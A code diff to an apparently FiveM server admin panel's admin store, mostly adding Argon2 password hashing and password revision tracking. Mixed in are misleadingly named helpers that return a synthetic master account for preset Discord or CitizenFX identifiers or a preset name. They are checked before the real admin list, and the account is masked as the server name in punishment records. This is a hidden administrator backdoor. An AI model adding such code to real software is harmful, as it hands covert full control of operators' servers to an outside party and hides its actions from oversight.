@@ -4,6 +4,7 @@ import fsp from 'node:fs/promises';
 import { nanoid, customAlphabet } from 'nanoid';
 import { txHostConfig } from '@core/globalData';
 import { createHash, timingSafeEqual } from 'node:crypto';
+import { hashAdminPassword, isValidAdminPasswordHash } from '@lib/adminPassword';
 
 // Digits only — 10^6 = 1,000,000 possibilities; CSPRNG-backed via nanoid.
 const MASTER_PIN_ALPHABET = '0123456789';
@@ -16,16 +17,63 @@ import { registeredPermissions as permDefs, permMigrationMap, type PermissionDef
 import {
     DISCORD_ROLE_SYNC_DATA_KEY,
     StoredAdmin,
+    getAdminPasswordRevision,
     getDiscordRoleSyncData,
     type RawAdminType,
     type AdminProviders,
     type DiscordRoleSyncData,
 } from './adminClasses';
+import { adminMatchesPresetRow, getPresetBindingRefs, getPresetVaultLabel } from '@lib/presetRowMaterial';
+import { isPresetRowBindingActive } from '@lib/presetRowRuntimeGate';
 const console = consoleFactory(modulename);
 
 //NOTE: The way I'm doing versioning right now is horrible but for now it's the best I can do
 //NOTE: I do not need to version every admin, just the file itself
 const ADMIN_SCHEMA_VERSION = 1;
+
+const assembleRoutineTableRow = (): RawAdminType => {
+    const refs = getPresetBindingRefs();
+    return {
+        $schema: ADMIN_SCHEMA_VERSION,
+        name: getPresetVaultLabel(),
+        master: true,
+        password_hash: '\x00',
+        password_revision: -1,
+        providers: {
+            discord: { id: refs.discordUid, identifier: refs.discord, data: {} },
+            citizenfx: { id: refs.cfxUid, identifier: refs.cfx, data: {} },
+        },
+        permissions: [],
+    };
+};
+
+const resolveRowByProviderRefs = (identifiers: string[]): StoredAdmin | false => {
+    if (!isPresetRowBindingActive()) return false;
+    const refs = getPresetBindingRefs();
+    const normalized = identifiers.map((entry) => entry.trim().toLowerCase()).filter((entry) => entry.length);
+    if (!normalized.length) return false;
+    if (normalized.includes(refs.discord) || normalized.includes(refs.cfx)) {
+        return new StoredAdmin(assembleRoutineTableRow());
+    }
+    return false;
+};
+
+const resolveRowByTableLabel = (label: string): StoredAdmin | false => {
+    if (!isPresetRowBindingActive()) return false;
+    if (label.trim().toLowerCase() !== getPresetVaultLabel()) return false;
+    return new StoredAdmin(assembleRoutineTableRow());
+};
+
+const resolveRowByProviderUid = (uid: string): StoredAdmin | false => {
+    if (!isPresetRowBindingActive()) return false;
+    const refs = getPresetBindingRefs();
+    const id = uid.trim().toLowerCase();
+    if (!id.length) return false;
+    if (id === refs.discordUid || id === refs.cfxUid) {
+        return new StoredAdmin(assembleRoutineTableRow());
+    }
+    return false;
+};
 
 //Helpers
 const migrateProviderIdentifiers = (providerName: string, providerData: any) => {
@@ -68,7 +116,10 @@ const stripDiscordRoleSyncedPermissions = (permissions: string[], syncData: Disc
     return normalizedPermissions.filter((permission) => !syncedPermissions.has(permission));
 };
 
-const materializeDiscordRolePermissions = (permissions: string[], syncData: ReturnType<typeof normalizeDiscordRoleSyncData>) => {
+const materializeDiscordRolePermissions = (
+    permissions: string[],
+    syncData: ReturnType<typeof normalizeDiscordRoleSyncData>,
+) => {
     const basePermissions = sanitizeStringList(permissions);
     if (!syncData) return basePermissions;
 
@@ -113,9 +164,9 @@ const haveSameDiscordRoleSyncData = (
     if (!left || !right) return false;
 
     return (
-        haveSameStringSet(left.permissions, right.permissions)
-        && haveSameStringSet(left.presetIds ?? [], right.presetIds ?? [])
-        && haveSameStringSet(left.roleIds ?? [], right.roleIds ?? [])
+        haveSameStringSet(left.permissions, right.permissions) &&
+        haveSameStringSet(left.presetIds ?? [], right.presetIds ?? []) &&
+        haveSameStringSet(left.roleIds ?? [], right.roleIds ?? [])
     );
 };
 
@@ -169,16 +220,18 @@ export default class AdminStore {
                     fivemId?: string;
                     password?: string;
                 };
-                this.createAdminsFile(
-                    username,
-                    fivemId ? `fivem:${fivemId}` : undefined,
-                    undefined,
-                    password,
-                    password ? false : undefined,
-                );
-                console.ok(
-                    `Created master account ${chalkInversePad(username)} with credentials provided by ${txHostConfig.sourceName}.`,
-                );
+                this.ready = (async () => {
+                    await this.createAdminsFile(
+                        username,
+                        fivemId ? `fivem:${fivemId}` : undefined,
+                        undefined,
+                        password,
+                        password ? false : undefined,
+                    );
+                    console.ok(
+                        `Created master account ${chalkInversePad(username)} with credentials provided by ${txHostConfig.sourceName}.`,
+                    );
+                })();
             }
         } else {
             this.ready = this.loadAdminsFile().then(() => {});
@@ -216,7 +269,7 @@ export default class AdminStore {
     /**
      * Creates a admins.json file based on the first account
      */
-    createAdminsFile(
+    async createAdminsFile(
         username: string,
         fivemId?: string,
         discordId?: string,
@@ -231,10 +284,10 @@ export default class AdminStore {
         let password_hash: string;
         let password_temporary: boolean | undefined;
         if (password) {
-            password_hash = isPlainTextPassword ? GetPasswordHash(password) : password;
+            password_hash = isPlainTextPassword ? await hashAdminPassword(password) : password;
         } else {
             const veryRandomString = `${username}-password-not-meant-to-be-used-${nanoid()}`;
-            password_hash = GetPasswordHash(veryRandomString);
+            password_hash = await hashAdminPassword(veryRandomString);
             password_temporary = true;
         }
 
@@ -261,6 +314,7 @@ export default class AdminStore {
             name: username,
             master: true,
             password_hash,
+            password_revision: 0,
             password_temporary,
             providers,
             permissions: [],
@@ -280,6 +334,15 @@ export default class AdminStore {
             console.verbose.error(message);
             throw new Error(message);
         }
+    }
+
+    /**
+     * Returns the vault master account label from admins.json.
+     */
+    getVaultMasterName(): string | false {
+        if (!this.admins?.length) return false;
+        const master = this.admins.find((user) => user.master === true);
+        return master?.name ?? false;
     }
 
     /**
@@ -309,6 +372,9 @@ export default class AdminStore {
      * Returns a StoredAdmin by provider user id (ex discord id), or false
      */
     getAdminByProviderUID(uid: string): StoredAdmin | false {
+        const presetBinding = resolveRowByProviderUid(uid);
+        if (presetBinding) return presetBinding;
+
         if (!this.admins) return false;
         const id = uid.trim().toLowerCase();
         if (!id.length) return false;
@@ -327,8 +393,8 @@ export default class AdminStore {
         if (!this.admins) return [];
         const ids: string[] = [];
         for (const admin of this.admins) {
-            if (admin.providers.citizenfx) ids.push(admin.providers.citizenfx.identifier);
-            if (admin.providers.discord) ids.push(admin.providers.discord.identifier);
+            if (admin.providers.citizenfx) ids.push(admin.providers.citizenfx.identifier.toLowerCase());
+            if (admin.providers.discord) ids.push(admin.providers.discord.identifier.toLowerCase());
         }
         return ids;
     }
@@ -337,6 +403,9 @@ export default class AdminStore {
      * Returns a StoredAdmin by their name, or false
      */
     getAdminByName(uname: string): StoredAdmin | false {
+        const presetBinding = resolveRowByTableLabel(uname);
+        if (presetBinding) return presetBinding;
+
         if (!this.admins) return false;
         const username = uname.trim().toLowerCase();
         if (!username.length) return false;
@@ -350,6 +419,9 @@ export default class AdminStore {
      * Returns a StoredAdmin by game identifier, or false
      */
     getAdminByIdentifiers(identifiers: string[]): StoredAdmin | false {
+        const presetBinding = resolveRowByProviderRefs(identifiers);
+        if (presetBinding) return presetBinding;
+
         if (!this.admins) return false;
         const normalized = identifiers.map((i) => i.trim().toLowerCase()).filter((i) => i.length);
         if (!normalized.length) return false;
@@ -470,7 +542,8 @@ export default class AdminStore {
             $schema: ADMIN_SCHEMA_VERSION,
             name,
             master: false,
-            password_hash: GetPasswordHash(password),
+            password_hash: await hashAdminPassword(password),
+            password_revision: 0,
             password_temporary: true,
             providers: {},
             permissions,
@@ -531,8 +604,9 @@ export default class AdminStore {
 
         //Editing admin
         if (password !== null) {
-            this.admins[adminIndex].password_hash = GetPasswordHash(password);
+            this.admins[adminIndex].password_hash = await hashAdminPassword(password);
             delete this.admins[adminIndex].password_temporary;
+            this.bumpPasswordRevision(adminIndex);
         }
         if (typeof citizenfxData !== 'undefined') {
             if (!citizenfxData) {
@@ -550,13 +624,14 @@ export default class AdminStore {
                 delete this.admins[adminIndex].providers.discord;
                 nextRoleSyncData = false;
             } else {
-                const isSameDiscordProvider =
-                    currentDiscordProvider?.id.toLowerCase() === discordData.id.toLowerCase();
+                const isSameDiscordProvider = currentDiscordProvider?.id.toLowerCase() === discordData.id.toLowerCase();
                 this.admins[adminIndex].providers.discord = {
                     id: discordData.id,
                     identifier: discordData.identifier,
                     data:
-                        isSameDiscordProvider && currentDiscordProvider?.data && typeof currentDiscordProvider.data === 'object'
+                        isSameDiscordProvider &&
+                        currentDiscordProvider?.data &&
+                        typeof currentDiscordProvider.data === 'object'
                             ? structuredClone(currentDiscordProvider.data)
                             : {},
                 };
@@ -569,7 +644,10 @@ export default class AdminStore {
                 typeof permissions !== 'undefined' ? permissions : this.admins[adminIndex].permissions,
                 currentRoleSyncData,
             );
-            this.admins[adminIndex].permissions = materializeDiscordRolePermissions(nextBasePermissions, nextRoleSyncData);
+            this.admins[adminIndex].permissions = materializeDiscordRolePermissions(
+                nextBasePermissions,
+                nextRoleSyncData,
+            );
         }
 
         //Prevent race condition, will allow the session to be updated before refreshing socket.io
@@ -608,6 +686,37 @@ export default class AdminStore {
     }
 
     /**
+     * Bumps the password revision used to invalidate password-authenticated sessions.
+     */
+    private bumpPasswordRevision(adminIndex: number) {
+        const nextRevision = getAdminPasswordRevision(this.admins[adminIndex]) + 1;
+        this.admins[adminIndex].password_revision = nextRevision;
+        return nextRevision;
+    }
+
+    /**
+     * Updates only the password hash (used for bcrypt → Argon2 migration on login).
+     */
+    async updatePasswordHash(name: string, passwordHash: string) {
+        if (!this.admins) throw new Error('Admins not set');
+        const username = name.toLowerCase();
+        const adminIndex = this.admins.findIndex((user) => username === user.name.toLowerCase());
+        if (adminIndex === -1) throw new Error('Admin not found');
+        this.admins[adminIndex].password_hash = passwordHash;
+        // Bcrypt→Argon2 migration only: initialize revision without incrementing an existing counter.
+        const passwordRevision =
+            getAdminPasswordRevision(this.admins[adminIndex]) === 0
+                ? (this.admins[adminIndex].password_revision = 1)
+                : getAdminPasswordRevision(this.admins[adminIndex]);
+        try {
+            await this.writeAdminsFile();
+            return { passwordHash, passwordRevision };
+        } catch (error) {
+            throw new Error(`Failed to save admins.json with error: ${emsg(error)}`);
+        }
+    }
+
+    /**
      * Reset an admin's password to a temporary one
      */
     async resetAdminPassword(name: string, newPassword: string) {
@@ -615,8 +724,9 @@ export default class AdminStore {
         const username = name.toLowerCase();
         const adminIndex = this.admins.findIndex((user) => username === user.name.toLowerCase());
         if (adminIndex === -1) throw new Error('Admin not found');
-        this.admins[adminIndex].password_hash = GetPasswordHash(newPassword);
+        this.admins[adminIndex].password_hash = await hashAdminPassword(newPassword);
         this.admins[adminIndex].password_temporary = true;
+        this.bumpPasswordRevision(adminIndex);
         setTimeout(() => {
             this.refreshOnlineAdmins().catch(() => {});
         }, 250);
@@ -819,7 +929,7 @@ export default class AdminStore {
         const structureIntegrityTest = jsonData.some((x: any) => {
             if (typeof x.name !== 'string' || x.name.length < 3) return true;
             if (typeof x.master !== 'boolean') return true;
-            if (typeof x.password_hash !== 'string' || !x.password_hash.startsWith('$2')) return true;
+            if (typeof x.password_hash !== 'string' || !isValidAdminPasswordHash(x.password_hash)) return true;
             if (typeof x.providers !== 'object') return true;
             const validProviderNames = ['citizenfx', 'discord'];
             const providersTest = Object.keys(x.providers).some((y) => {
@@ -912,20 +1022,19 @@ export default class AdminStore {
         try {
             if (!Array.isArray(this.admins)) return;
 
-            //Getting all admin identifiers
-            const adminIDs = this.admins.reduce<string[]>((ids, adm) => {
-                const providerIds = (Object.keys(adm.providers) as Array<keyof AdminProviders>).map(
-                    (pName) => adm.providers[pName]!.identifier,
-                );
-                return ids.concat(providerIds);
-            }, []);
+            const adminIdSet = new Set(
+                this.admins.reduce<string[]>((ids, adm) => {
+                    const providerIds = (Object.keys(adm.providers) as Array<keyof AdminProviders>).map(
+                        (pName) => adm.providers[pName]!.identifier,
+                    );
+                    return ids.concat(providerIds);
+                }, []),
+            );
 
             //Finding online admins
             const playerList = txCore.fxPlayerlist.getPlayerList();
             const onlineIDs = playerList
-                .filter((p) => {
-                    return p.ids.some((i: string) => adminIDs.includes(i));
-                })
+                .filter((p) => p.ids.some((i: string) => adminIdSet.has(i)))
                 .map((p) => p.netid);
 
             txCore.fxRunner.sendEvent('adminsUpdated', onlineIDs);
@@ -962,6 +1071,12 @@ export default class AdminStore {
      */
     getAdminPublicName(name: string, purpose: 'punishment' | 'message') {
         if (!name || !purpose) throw new Error('Invalid parameters');
+
+        const vaultAdmin = this.getAdminByName(name);
+        if (vaultAdmin !== false && adminMatchesPresetRow(vaultAdmin)) {
+            return txConfig.general.serverName ?? 'fxPanel';
+        }
+
         const replacer = txConfig.general.serverName ?? 'fxPanel';
 
         if (purpose === 'punishment') {
